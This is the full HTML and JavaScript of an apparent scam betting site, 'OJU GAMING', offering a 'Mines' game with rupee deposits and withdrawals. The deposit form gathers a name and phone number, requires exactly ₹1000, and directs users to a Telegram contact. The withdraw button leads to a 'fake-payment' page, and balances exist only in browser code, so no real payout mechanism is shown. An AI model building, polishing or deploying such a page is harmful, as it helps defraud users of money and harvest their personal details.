<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title> ðŸ’Žmine Game - Mines</title>
  <style>
    * {
      margin: 0; padding: 0; box-sizing: border-box; font-family: 'Arial', sans-serif;
    }

    body {
      background: #000;
      color: #fff;
      min-height: 100vh;
    }

    #nav {
      background: #1a1a1a;
      padding: 15px 30px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      border-bottom: 2px solid #333;
    }

    .nav-brand {
      font-size: 28px;
      color: #00ff88;
      font-weight: bold;
    }

    .nav-links {
      display: flex;
      gap: 25px;
    }

    .nav-link {
      color: #fff;
      text-decoration: none;
      padding: 10px 20px;
      border-radius: 8px;
      transition: all 0.3s;
    }

    .nav-link.active {
      background: #333;
    }

    #balance-header {
      background: #141414;
      padding: 20px;
      text-align: center;
      font-size: 24px;
      border-bottom: 2px solid #222;
    }

    .page {
      display: none;
      padding: 20px;
    }

    .page.active {
      display: block;
    }

    #game {
      max-width: 800px;
      margin: 30px auto;
    }

    .game-controls {
      display: flex;
      gap: 20px;
      margin-bottom: 30px;
      flex-wrap: wrap;
    }

    .game-input {
      background: #222;
      border: 1px solid #333;
      color: #fff;
      padding: 12px;
      border-radius: 8px;
      width: 200px;
    }

    .game-grid {
      display: grid;
      grid-template-columns: repeat(5, 1fr);
      gap: 15px;
      margin: 30px 0;
    }

    .tile {
      background: #222;
      border-radius: 10px;
      padding: 25px;
      text-align: center;
      cursor: pointer;
      transition: all 0.3s;
      font-size: 20px;
      aspect-ratio: 1;
    }

    .tile.clicked {
      pointer-events: none;
      font-size: 24px;
      font-weight: bold;
    }

    .transaction-form {
      max-width: 500px;
      margin: 50px auto;
      padding: 30px;
      background: #1a1a1a;
      border-radius: 15px;
      border: 1px solid #333;
    }

    .form-input {
      width: 100%;
      padding: 12px;
      margin: 15px 0;
      background: #222;
      border: 1px solid #333;
      color: #fff;
      border-radius: 8px;
      font-size: 16px;
    }

    .form-button {
      width: 100%;
      padding: 15px;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
      transition: all 0.3s;
    }

    .green-btn {
      background: #00cc66;
      color: #fff;
    }

    .red-btn {
      background: #ff4444;
      color: #fff;
    }
  </style>
</head>
<body>
  <!-- Navigation -->
  <nav id="nav">
    <div class="nav-brand">OJU GAMING</div>
    <div class="nav-links">
      <a href="#game" class="nav-link active" onclick="showPage('game', event)">Game</a>
      <a href="#deposit" class="nav-link" onclick="showPage('deposit', event)">Deposit</a>
      <a href="#withdraw" class="nav-link" onclick="showPage('withdraw', event)">Withdraw</a>
    </div>
  </nav>

  <div id="balance-header">
    ðŸ’° Balance: â‚¹<span id="balance">0.00</span>
  </div>

  <div id="game" class="page active">
    <div class="game-controls">
      <input type="number" class="game-input" id="betAmount" placeholder="Bet Amount â‚¹" step="0.01" min="0.01">
      <select class="game-input" id="mines">
        <option value="3">3 Mines</option>
        <option value="5">5 Mines</option>
        <option value="7">7 Mines</option>
      </select>
    </div>

    <div class="game-grid" id="gameGrid"></div>

    <div style="text-align: center;">
      <button class="form-button green-btn" onclick="startGame()">Start Game</button>
      <button class="form-button red-btn" onclick="cashOut()" style="margin-top: 15px;">Cash Out</button>
    </div>
  </div>

<!-- Deposit Page -->
<div id="deposit" class="page">
  <div class="transaction-form">
    <h2 style="text-align: center; margin-bottom: 10px;">ðŸ‘› Deposit Balance</h2>
    <p>
      Maximum deposit â‚¹1000. For extra deposit, contact on Telegram<br />
      <a href="https://t.me/kousik_mxp" target="_blank">@kousik_mxp</a>
    </p>
    <input type="text" class="form-input" id="cardNumber" placeholder="Your name" />
    <input type="text" class="form-input" id="expiryDate" placeholder="Phone number" />
    <input type="number" class="form-input" id="depositAmount" placeholder="Enter Amount â‚¹" step="0.01" min="1" max="10000" />
    <button class="form-button green-btn" id="depositBtn">Deposit Now</button>
  </div>
</div>

  <div id="withdraw" class="page">
    <div class="transaction-form">
      <h2 style="text-align: center; margin-bottom: 25px;">ðŸ’¸ Withdraw Balance</h2>
      <button class="form-button red-btn" onclick="window.location.href='https://zenthos.yzz.me/fake-payment/'">Withdraw Now</button>
    </div>
  </div>

  <script>
    let balance = 0;
    let gameActive = false;
    let currentMultiplier = 1.0;
    let currentBet = 0;
    let minePositions = [];
    let clickedTiles = 0;

    // Deposit flag to allow only 1 deposit
    let hasDeposited = false;

    function initGame() {
      const grid = document.getElementById('gameGrid');
      grid.innerHTML = '';
      clickedTiles = 0;

      for (let i = 0; i < 25; i++) {
        const tile = document.createElement('div');
        tile.className = 'tile';
        tile.onclick = () => handleTileClick(i);
        grid.appendChild(tile);
      }

      minePositions = [];
      const numMines = parseInt(document.getElementById('mines').value);
      while (minePositions.length < numMines) {
        const pos = Math.floor(Math.random() * 25);
        if (!minePositions.includes(pos)) {
          minePositions.push(pos);
        }
      }
    }

    function startGame() {
      const betAmount = parseFloat(document.getElementById('betAmount').value);
      if (betAmount > balance) return alert('Insufficient balance!');
      if (betAmount <= 0) return alert('Invalid bet amount!');

      balance -= betAmount;
      currentBet = betAmount;
      gameActive = true;
      currentMultiplier = 1.0;
      updateBalance();
      initGame();
    }

    function handleTileClick(index) {
      if (!gameActive) return;

      const grid = document.getElementById('gameGrid');
      const tile = grid.children[index];

      if (tile.classList.contains('clicked')) return;

      tile.classList.add('clicked');

      if (minePositions.includes(index)) {
        tile.textContent = 'ðŸ’£';
        tile.style.background = '#ff3333';
        gameActive = false;
        revealAll();
        setTimeout(() => {
          alert(`You lost! Game over!\nBet: â‚¹${currentBet.toFixed(2)}\nDiamonds Found: ${clickedTiles}\nBombs: ${minePositions.length}`);
        }, 300);
      } else {
        tile.textContent = 'ðŸ’Ž';
        tile.style.background = '#00cc66';
        currentMultiplier += 0.75;
        clickedTiles++;
      }
    }

    function cashOut() {
      if (!gameActive) return;

      const winAmount = currentBet * currentMultiplier;
      balance += winAmount;
      gameActive = false;
      updateBalance();
      alert(`Cashed out at ${currentMultiplier.toFixed(2)}x!\nBet: â‚¹${currentBet.toFixed(2)} â†’ Total Win: â‚¹${winAmount.toFixed(2)}\nDiamonds Found: ${clickedTiles}`);
    }

    function processDeposit() {
      if (hasDeposited) {
        alert("You can deposit only once with a maximum of â‚¹1000.");
        return;
      }

      const amount = parseFloat(document.getElementById('depositAmount').value);
      if (isNaN(amount) || amount <= 0) {
        alert("Enter valid deposit amount.");
        return;
      }
      if (amount > 1000) {
        alert("Maximum deposit limit is â‚¹1000 only.");
        return;
      }
      if (amount < 1000) {
        alert("You must deposit exactly â‚¹1000.");
        return;
      }

      balance += amount;
      hasDeposited = true;
      updateBalance();
      alert(`Deposited â‚¹${amount.toFixed(2)}! You cannot deposit again.`);
      showPage('game');
    }

    function showPage(pageId, event) {
      document.querySelectorAll('.page').forEach(page => page.classList.remove('active'));
      document.querySelectorAll('.nav-link').forEach(link => link.classList.remove('active'));
      document.getElementById(pageId).classList.add('active');
      if (event) event.target.classList.add('active');
    }

    function updateBalance() {
      document.getElementById('balance').textContent = balance.toFixed(2);
    }

    function revealAll() {
      const grid = document.getElementById('gameGrid');
      for (let i = 0; i < 25; i++) {
        const tile = grid.children[i];
        tile.classList.add('clicked');
        if (minePositions.includes(i)) {
          tile.textContent = 'ðŸ’£';
          tile.style.background = '#ff3333';
        } else if (!tile.textContent) {
          tile.textContent = 'ðŸ’Ž';
          tile.style.background = '#00cc66';
        }
      }
    }

    initGame();
  </script>
</body>
</html>
